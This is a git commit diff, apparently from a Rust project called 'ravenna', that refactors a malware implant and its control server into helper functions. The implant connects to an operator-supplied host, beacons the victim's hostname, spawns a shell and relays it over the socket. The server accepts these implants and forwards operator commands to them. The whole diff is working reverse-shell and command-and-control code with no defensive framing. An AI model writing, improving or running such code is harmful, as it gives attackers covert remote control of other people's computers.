94f8ad23d4497954940e185a9ac08b1d6324caa0
twili8t <twili8@proton.me>
2026-09-04 13:43:20 -0400

    split large function into helpers

--- src/bin/implant.rs
+++ src/bin/implant.rs
@@ -12,10 +12,7 @@ use std::sync::Arc;
 fn _implant_id() -> String {
     let mut _buf = [0u8; 64];
     unsafe {
-        libc::gethostname(
-            _buf.as_mut_ptr() as *mut libc::c_char,
-            _buf.len() as libc::size_t,
-        );
+        libc::gethostname(_buf.as_mut_ptr() as *mut libc::c_char, _buf.len());
     }
     let _s = CStr::from_bytes_until_nul(&_buf)
         .map(|_c| _c.to_string_lossy().trim().to_owned())
@@ -27,65 +24,66 @@ fn _env(_m: envelope::M) -> Envelope {
     Envelope { m: Some(_m) }
 }
 
-fn _pump(_sock: Sock) {
-    let _sock = Arc::new(_sock);
-    let _id = _implant_id();
+fn _beacon(_sock: &Sock, _id: &str) {
+    let _b = _env(envelope::M::B(Beacon {
+        implant_id: _id.into(),
+    }));
+    let _s = _env(envelope::M::S(ShellStart {
+        implant_id: _id.into(),
+    }));
+    frame::send_msg(_sock, &_b);
+    frame::send_msg(_sock, &_s);
+}
 
-    frame::send_msg(
-        &_sock,
-        &_env(envelope::M::B(Beacon {
-            implant_id: _id.clone(),
-        })),
-    );
-    frame::send_msg(
-        &_sock,
-        &_env(envelope::M::S(ShellStart { implant_id: _id })),
-    );
-
-    let _sh = shell::spawn_shell();
-
-    // shell -> socket blocks on shell_read
-    let _s1 = _sock.clone();
-    let _out_fd = _sh.stdout_fd;
-    let _pid = _sh.pid;
-    let _t1 = std::thread::spawn(move || {
-        let mut _out = [0u8; 4096];
-        loop {
-            let _n = shell::shell_read(_out_fd, &mut _out);
-            if _n <= 0 {
-                let mut _st = 0 as libc::c_int;
-                if unsafe { libc::waitpid(_pid, &mut _st, libc::WNOHANG) } == _pid {
-                    frame::send_msg(&_s1, &_env(envelope::M::E(ShellExit { code: _st })));
-                }
-                break;
-            }
-            frame::send_msg(
-                &_s1,
-                &_env(envelope::M::D(ShellData {
-                    chunk: _out[.._n as usize].to_vec(),
-                })),
-            );
+fn _up(_sock: Arc<Sock>, _out_fd: libc::c_int, _pid: libc::pid_t) {
+    let mut _out = [0u8; 4096];
+    loop {
+        let _n = shell::shell_read(_out_fd, &mut _out);
+        if _n <= 0 {
+            _exit_notice(&_sock, _pid);
+            break;
         }
-    });
+        let _m = envelope::M::D(ShellData {
+            chunk: _out[.._n as usize].to_vec(),
+        });
+        frame::send_msg(&_sock, &_env(_m));
+    }
+}
 
-    // socket -> shell blocks on recv_msg
-    let _s2 = _sock.clone();
-    let _in_fd = _sh.stdin_fd;
-    let _t2 = std::thread::spawn(move || {
-        while let Some(_env) = frame::recv_msg(&_s2) {
-            if let Some(envelope::M::D(_d)) = _env.m {
-                shell::shell_write(_in_fd, &_d.chunk);
-            }
+fn _exit_notice(_sock: &Sock, _pid: libc::pid_t) {
+    let mut _st = 0 as libc::c_int;
+    if unsafe { libc::waitpid(_pid, &mut _st, libc::WNOHANG) } == _pid {
+        frame::send_msg(_sock, &_env(envelope::M::E(ShellExit { code: _st })));
+    }
+}
+
+fn _down(_sock: Arc<Sock>, _in_fd: libc::c_int) {
+    while let Some(_e) = frame::recv_msg(&_sock) {
+        if let Some(envelope::M::D(_d)) = _e.m {
+            shell::shell_write(_in_fd, &_d.chunk);
         }
-    });
+    }
+}
 
-    let _ = _t1.join();
-    // shell died, close socket so the other thread unblocks
+fn _close(_sock: &Sock, _sh: &shell::Shell) {
     unsafe {
         libc::shutdown(_sock.fd(), libc::SHUT_RDWR);
         libc::close(_sh.stdin_fd);
         libc::close(_sh.stdout_fd);
     }
+}
+
+fn _pump(_sock: Sock) {
+    let _sock = Arc::new(_sock);
+    _beacon(&_sock, &_implant_id());
+    let _sh = shell::spawn_shell();
+    let _s1 = _sock.clone();
+    let _s2 = _sock.clone();
+    let (_out_fd, _in_fd, _pid) = (_sh.stdout_fd, _sh.stdin_fd, _sh.pid);
+    let _t1 = std::thread::spawn(move || _up(_s1, _out_fd, _pid));
+    let _t2 = std::thread::spawn(move || _down(_s2, _in_fd));
+    let _ = _t1.join();
+    _close(&_sock, &_sh);
     let _ = _t2.join();
 }
 
@@ -93,7 +91,6 @@ fn main() {
     let _args: Vec<String> = std::env::args().collect();
     let _host = _args.get(1).cloned().unwrap_or_else(|| "127.0.0.1".into());
     let _port: u16 = _args.get(2).and_then(|_p| _p.parse().ok()).unwrap_or(8080);
-
     loop {
         eprintln!("implant trying {_host}:{_port} ...");
         _pump(Sock::new(SockRole::Client {
--- src/bin/server.rs
+++ src/bin/server.rs
@@ -8,85 +8,77 @@ use ravenna::proto::{Envelope, ShellData, envelope};
 use ravenna::socket::{Sock, SockRole};
 use std::sync::Arc;
 
-fn _handle(_c: Sock) {
-    let _c = Arc::new(_c);
+fn _emit(_chunk: &[u8]) {
+    unsafe {
+        libc::write(1, _chunk.as_ptr() as *const std::ffi::c_void, _chunk.len());
+    }
+}
 
-    // socket -> stdout, blocks on recv_msg
-    let _s1 = _c.clone();
-    let _t1 = std::thread::spawn(move || {
-        loop {
-            match frame::recv_msg(&_s1) {
-                Some(_env) => match _env.m {
-                    Some(envelope::M::D(_d)) => unsafe {
-                        libc::write(
-                            1,
-                            _d.chunk.as_ptr() as *const std::ffi::c_void,
-                            _d.chunk.len() as libc::size_t,
-                        );
-                    },
-                    Some(envelope::M::E(_e)) => {
-                        eprintln!("\nshell exited code={}", _e.code);
-                        break;
-                    }
-                    Some(envelope::M::B(_b)) => {
-                        eprintln!("\nbeacon id={}", _b.implant_id);
-                    }
-                    _ => {}
-                },
-                None => {
-                    eprintln!("\nimplant went away.");
-                    break;
-                }
-            }
+fn _on_msg(_env: Envelope) -> bool {
+    match _env.m {
+        Some(envelope::M::D(_d)) => _emit(&_d.chunk),
+        Some(envelope::M::E(_e)) => {
+            eprintln!("\nshell exited code={}", _e.code);
+            return false;
         }
-    });
+        Some(envelope::M::B(_b)) => eprintln!("\nbeacon id={}", _b.implant_id),
+        _ => {}
+    }
+    true
+}
 
-    // stdin -> socket, blocks on stdin read
-    let _s2 = _c.clone();
+fn _net_to_out(_sock: Arc<Sock>) {
+    while let Some(_e) = frame::recv_msg(&_sock) {
+        if !_on_msg(_e) {
+            break;
+        }
+    }
+    eprintln!("\nimplant went away.");
+}
+
+fn _stdin_to_net(_sock: Arc<Sock>) {
+    let mut _in = [0u8; 4096];
     loop {
-        let mut _in = [0u8; 4096];
-        let _n: isize = unsafe {
-            libc::read(
-                0,
-                _in.as_mut_ptr() as *mut std::ffi::c_void,
-                _in.len() as libc::size_t,
-            )
-        };
+        let _n = unsafe { libc::read(0, _in.as_mut_ptr() as *mut _, _in.len()) };
         if _n <= 0 {
             break;
         }
-        frame::send_msg(
-            &_s2,
-            &Envelope {
-                m: Some(envelope::M::D(ShellData {
-                    chunk: _in[.._n as usize].to_vec(),
-                })),
-            },
-        );
+        let _m = envelope::M::D(ShellData {
+            chunk: _in[.._n as usize].to_vec(),
+        });
+        frame::send_msg(&_sock, &Envelope { m: Some(_m) });
     }
+}
 
+fn _handle(_c: Sock) {
+    let _c = Arc::new(_c);
+    let _r = _c.clone();
+    let _t1 = std::thread::spawn(move || _net_to_out(_r));
+    _stdin_to_net(_c.clone());
     unsafe {
         libc::shutdown(_c.fd(), libc::SHUT_RDWR);
     }
     let _ = _t1.join();
 }
 
-fn main() {
+fn _listen_addr() -> (String, u16) {
     let _args: Vec<String> = std::env::args().collect();
-    let _iface = _args.get(1).cloned().unwrap_or("0.0.0.0".to_string());
+    let _iface = _args.get(1).cloned().unwrap_or_else(|| "0.0.0.0".into());
     let _port: u16 = _args.get(2).and_then(|_p| _p.parse().ok()).unwrap_or(8080);
+    (_iface, _port)
+}
 
-    let _listener: Sock = Sock::new(SockRole::Server {
+fn main() {
+    let (_iface, _port) = _listen_addr();
+    let _l = Sock::new(SockRole::Server {
         interface: _iface.clone(),
         port: _port,
         backlog: 5,
     });
     eprintln!("server listening on {_iface}:{_port} ...");
-
     loop {
-        let _c = _listener.accept();
         eprintln!("got implant!");
-        _handle(_c);
+        _handle(_l.accept());
         eprintln!("waiting for next implant ...");
     }
 }
